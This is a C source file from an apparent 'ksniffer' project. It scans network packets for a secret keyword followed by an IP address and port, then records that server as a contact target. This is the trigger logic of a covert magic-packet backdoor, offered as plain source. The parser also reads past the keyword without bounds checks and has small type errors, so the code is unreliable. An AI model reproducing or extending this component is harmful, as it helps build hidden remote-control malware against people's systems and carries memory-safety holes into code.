#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "hw/ksniffer/packet_analyzer.h"
#include "hw/ksniffer/util.h"

struct PacketAnalyzer
{
    const char *keyword;
};

static const char *find_first_occurrence(const char* buf, size_t buf_size, const char *str);

PacketInfoPtr packet_info_create(void)
{
    return (PacketInfoPtr)malloc(sizeof(PacketInfo));
}

void packet_info_delete(PacketInfoPtr packet_info)
{
    free(packet_info);
}

PacketAnalyzerPtr packet_analyzer_create(void)
{
    PacketAnalyzerPtr packet_analyzer = (PacketAnalyzerPtr)malloc(sizeof(PacketAnalyzer));
    packet_analyzer->keyword = KEYWORD_RUN_SNIFFING;

    return packet_analyzer;
}

void packet_analyzer_delete(PacketAnalyzerPtr packet_analyzer)
{
    free(packet_analyzer);
}

/**
  * secret packet must contain:
  *
  * [ ........... <KEYWORD>:<IP>:<PORT> ...........]
  *                          ^    ^
  *                          |    |
  *                               consists of 2 bytes
  *                          |
  *                         consists of 4 bytes
  *
*/

#define SERVER_IP_ADDRESS_LENGTH 4
#define SERVER_PORT_LENGTH 2

PacketInfoPtr packet_analyzer_analyze_packet(PacketAnalyzerPtr packet_analyzer, const char *buf, size_t size)
{
    PacketInfoPtr packet_info;
    const char *keyword;
    const char *bufpos;
    struct in_addr addr;
    char *server_ip;
    int port;

    packet_info = packet_info_create();
    keyword = packet_analyzer->keyword;

    if ((bufpos = find_first_occurrence (buf, size, keyword)) != NULL) {
        bufpos += strlen(keyword) + 1;

        memcpy((char *)&addr.s_addr, bufpos, sizeof(addr.s_addr));
        server_ip = inet_ntoa(addr);
        bufpos += sizeof(addr.s_addr) + 1;

        port = ntohs(*(uint16_t *)bufpos);

        packet_info->server_ip = server_ip;
        packet_info->port = port;
        packet_info->is_secret = 1;

        print_msg("server:");
        print_msg(server_ip);
        printf("%d\n", port);
    }
    else {
        packet_info->is_secret = 0;
        packet_info->server_ip = '\0';
        packet_info->port = -1;
    }

    return packet_info;
}

static const char *find_first_occurrence(const char* buf, size_t buf_size, const char *str)
{
    size_t i;
    size_t len;

    len = strlen(str);

    if (buf_size < len) {
        return NULL;
    }

    for (i = 0; i < buf_size - len; ++i) {
        const char *start_pos = buf + i;
        if (memcmp(start_pos, str, len) == 0) {
            return start_pos;
        }
    }

    return NULL;
}
